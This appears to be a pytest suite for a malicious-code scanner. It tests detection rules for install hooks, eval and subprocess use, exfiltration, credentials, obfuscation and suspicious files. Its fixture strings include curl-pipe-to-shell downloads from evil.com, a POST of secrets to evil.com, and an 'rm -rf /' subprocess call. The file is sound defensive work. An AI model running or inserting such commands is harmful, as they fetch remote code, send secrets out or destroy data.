"""
Sigil API — Scanner Service Tests

Tests the regex scanner rules against known malicious and benign code samples
to verify detection accuracy across all six scan phases.
"""

from __future__ import annotations

import pytest

from api.services.scanner import (
    ALL_RULES,
    CODE_PATTERN_RULES,
    CREDENTIAL_RULES,
    INSTALL_HOOK_RULES,
    NETWORK_EXFIL_RULES,
    OBFUSCATION_RULES,
    PROVENANCE_RULES,
    Rule,
    scan_content,
    scan_directory,
    _scan_content,
    _scan_filename,
)
from api.models import Finding, ScanPhase, Severity


class TestInstallHookDetection:
    """Phase 1: Install hook detection."""

    def test_detect_npm_postinstall(self) -> None:
        """Should detect npm postinstall scripts."""
        content = '{\n  "scripts": {\n    "postinstall": "node malicious.js"\n  }\n}'
        findings = scan_content(content, "package.json")
        rule_ids = [f.rule for f in findings]
        assert "install-npm-postinstall" in rule_ids

    def test_detect_npm_preinstall(self) -> None:
        """Should detect npm preinstall scripts."""
        content = '{\n  "scripts": {\n    "preinstall": "curl evil.com | sh"\n  }\n}'
        findings = scan_content(content, "package.json")
        rule_ids = [f.rule for f in findings]
        assert "install-npm-postinstall" in rule_ids  # Same rule covers pre and post

    def test_detect_setup_py_cmdclass(self) -> None:
        """Should detect Python setup.py cmdclass overrides."""
        content = """
from setuptools import setup
setup(
    name='evil',
    cmdclass = {
        'install': CustomInstall,
    },
)
"""
        findings = scan_content(content, "setup.py")
        rule_ids = [f.rule for f in findings]
        assert "install-setup-py-cmdclass" in rule_ids

    def test_detect_curl_pipe_bash(self) -> None:
        """Should detect curl piped to bash."""
        content = "curl -sSL https://evil.com/payload.sh | bash"
        findings = scan_content(content, "install.sh")
        rule_ids = [f.rule for f in findings]
        assert "install-makefile-curl" in rule_ids

    def test_install_hooks_severity(self) -> None:
        """Install hook findings should have CRITICAL or HIGH severity."""
        for rule in INSTALL_HOOK_RULES:
            assert rule.severity in (Severity.CRITICAL, Severity.HIGH)


class TestCodePatternDetection:
    """Phase 2: Dangerous code pattern detection."""

    def test_detect_eval(self) -> None:
        """Should detect eval() calls."""
        content = "result = eval(user_input)"
        findings = scan_content(content, "script.py")
        rule_ids = [f.rule for f in findings]
        assert "code-eval" in rule_ids

    def test_detect_exec(self) -> None:
        """Should detect exec() calls."""
        content = "exec(compile(code, '<string>', 'exec'))"
        findings = scan_content(content, "script.py")
        rule_ids = [f.rule for f in findings]
        assert "code-exec" in rule_ids

    def test_detect_pickle_loads(self) -> None:
        """Should detect pickle.loads() calls."""
        content = "import pickle\ndata = pickle.loads(untrusted_data)"
        findings = scan_content(content, "data.py")
        rule_ids = [f.rule for f in findings]
        assert "code-pickle-load" in rule_ids

    def test_detect_subprocess(self) -> None:
        """Should detect subprocess.run/call/Popen."""
        content = "import subprocess\nsubprocess.run(['rm', '-rf', '/'])"
        findings = scan_content(content, "cleanup.py")
        rule_ids = [f.rule for f in findings]
        assert "code-child-process" in rule_ids

    def test_detect_child_process_node(self) -> None:
        """Should detect Node.js child_process usage."""
        content = "const { exec } = require('child_process');\nchild_process.exec('whoami');"
        findings = scan_content(content, "index.js")
        rule_ids = [f.rule for f in findings]
        assert "code-child-process" in rule_ids

    def test_detect_dynamic_import(self) -> None:
        """Should detect __import__() calls."""
        content = "mod = __import__('os')\nmod.system('id')"
        findings = scan_content(content, "sneaky.py")
        rule_ids = [f.rule for f in findings]
        assert "code-importlib" in rule_ids


class TestNetworkExfilDetection:
    """Phase 3: Network/exfiltration detection."""

    def test_detect_webhook_url(self) -> None:
        """Should detect webhook URLs (Discord, Slack)."""
        content = "url = 'https://discord.com/api/webhooks/12345/token'"
        findings = scan_content(content, "exfil.py")
        rule_ids = [f.rule for f in findings]
        assert "net-webhook" in rule_ids

    def test_detect_slack_webhook(self) -> None:
        """Should detect Slack webhook URLs."""
        content = "requests.post('https://hooks.slack.com/services/T00/B00/xxx')"
        findings = scan_content(content, "notify.py")
        rule_ids = [f.rule for f in findings]
        assert "net-webhook" in rule_ids

    def test_detect_raw_socket(self) -> None:
        """Should detect raw socket creation."""
        content = "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
        findings = scan_content(content, "backdoor.py")
        rule_ids = [f.rule for f in findings]
        assert "net-raw-socket" in rule_ids

    def test_detect_http_request(self) -> None:
        """Should detect outbound HTTP requests."""
        content = "import requests\nrequests.post('https://evil.com/steal', data=secrets)"
        findings = scan_content(content, "exfil.py")
        rule_ids = [f.rule for f in findings]
        assert "net-http-request" in rule_ids


class TestCredentialDetection:
    """Phase 4: Credential/secret detection."""

    def test_detect_env_access(self) -> None:
        """Should detect sensitive environment variable access."""
        content = "aws_key = os.environ['AWS_SECRET_ACCESS_KEY']"
        findings = scan_content(content, "config.py")
        rule_ids = [f.rule for f in findings]
        assert "cred-env-access" in rule_ids

    def test_detect_hardcoded_key(self) -> None:
        """Should detect hardcoded API keys."""
        content = "api_key = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij'"
        findings = scan_content(content, "config.py")
        rule_ids = [f.rule for f in findings]
        assert "cred-hardcoded-key" in rule_ids

    def test_detect_private_key(self) -> None:
        """Should detect embedded private keys."""
        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----"
        findings = scan_content(content, "id_rsa")
        rule_ids = [f.rule for f in findings]
        assert "cred-ssh-private" in rule_ids

    def test_detect_aws_key(self) -> None:
        """Should detect AWS access key ID patterns."""
        content = "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'"
        findings = scan_content(content, "credentials.py")
        rule_ids = [f.rule for f in findings]
        assert "cred-aws-key" in rule_ids


class TestObfuscationDetection:
    """Phase 5: Obfuscation detection."""

    def test_detect_base64_decode(self) -> None:
        """Should detect base64 decoding."""
        content = "import base64\npayload = base64.b64decode('ZXZpbCBjb2Rl')"
        findings = scan_content(content, "loader.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-base64-decode" in rule_ids

    def test_detect_atob(self) -> None:
        """Should detect JavaScript atob() calls."""
        content = "var code = atob('ZXZpbCBjb2Rl'); eval(code);"
        findings = scan_content(content, "payload.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-base64-decode" in rule_ids

    def test_detect_charcode(self) -> None:
        """Should detect String.fromCharCode usage."""
        content = "var s = String.fromCharCode(101,118,105,108);"
        findings = scan_content(content, "obfuscated.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-charcode" in rule_ids

    def test_detect_hex_encoding(self) -> None:
        """Should detect hex-encoded strings."""
        content = r"data = b'\x65\x76\x69\x6c\x20\x63\x6f\x64\x65'"
        findings = scan_content(content, "encoded.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-hex-decode" in rule_ids

    def test_detect_string_reversal(self) -> None:
        """Should detect string reversal obfuscation."""
        content = "cmd = 'metsys.so'[::-1]"
        findings = scan_content(content, "tricky.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-reverse-string" in rule_ids


class TestProvenanceDetection:
    """Phase 6: Provenance/file checks."""

    def test_detect_hidden_file(self) -> None:
        """Should flag hidden files."""
        findings = list(_scan_filename(".evil_config", PROVENANCE_RULES))
        rule_ids = [f.rule for f in findings]
        assert "prov-hidden-file" in rule_ids

    def test_detect_binary_file(self) -> None:
        """Should flag binary files in the repository."""
        findings = list(_scan_filename("payload.exe", PROVENANCE_RULES))
        rule_ids = [f.rule for f in findings]
        assert "prov-binary-in-repo" in rule_ids

    def test_detect_dll(self) -> None:
        """Should flag DLL files."""
        findings = list(_scan_filename("helper.dll", PROVENANCE_RULES))
        rule_ids = [f.rule for f in findings]
        assert "prov-binary-in-repo" in rule_ids

    def test_detect_minified_js(self) -> None:
        """Should flag minified JavaScript."""
        findings = list(_scan_filename("bundle.min.js", PROVENANCE_RULES))
        rule_ids = [f.rule for f in findings]
        assert "prov-minified" in rule_ids

    def test_normal_file_no_provenance_flags(self) -> None:
        """Regular source files should not trigger provenance rules."""
        findings = list(_scan_filename("index.js", PROVENANCE_RULES))
        assert len(findings) == 0


class TestRuleCompleteness:
    """Meta-tests for rule set coverage."""

    def test_all_phases_have_rules(self) -> None:
        """Every scan phase should have at least one rule."""
        phases_with_rules = {rule.phase for rule in ALL_RULES}
        for phase in ScanPhase:
            assert phase in phases_with_rules, f"No rules for phase: {phase.value}"

    def test_rules_have_unique_ids(self) -> None:
        """All rule IDs should be unique."""
        ids = [rule.id for rule in ALL_RULES]
        assert len(ids) == len(set(ids)), "Duplicate rule IDs found"

    def test_rules_have_descriptions(self) -> None:
        """All rules should have non-empty descriptions."""
        for rule in ALL_RULES:
            assert rule.description, f"Rule {rule.id} has no description"

    def test_rule_patterns_compile(self) -> None:
        """All rule patterns should be valid compiled regexes."""
        for rule in ALL_RULES:
            assert rule.pattern is not None, f"Rule {rule.id} pattern is None"
            # Patterns are pre-compiled, so this just verifies they exist
            assert hasattr(rule.pattern, "search"), f"Rule {rule.id} pattern not compiled"


class TestBenignCodeNotFlagged:
    """Ensure common benign patterns do not trigger false positives."""

    def test_console_log_not_eval(self) -> None:
        """console.log should not be flagged as eval."""
        content = "console.log('hello world');"
        findings = scan_content(content, "app.js")
        rule_ids = [f.rule for f in findings]
        assert "code-eval" not in rule_ids

    def test_import_statement_not_flagged(self) -> None:
        """Standard import statements should not trigger dynamic import rules."""
        content = "import os\nimport sys\nfrom pathlib import Path"
        findings = scan_content(content, "normal.py")
        rule_ids = [f.rule for f in findings]
        assert "code-importlib" not in rule_ids

    def test_regular_string_not_obfuscation(self) -> None:
        """Regular strings should not be flagged as obfuscation."""
        content = 'message = "Hello, world!"'
        findings = scan_content(content, "greet.py")
        obf_findings = [f for f in findings if f.phase == ScanPhase.OBFUSCATION]
        assert len(obf_findings) == 0
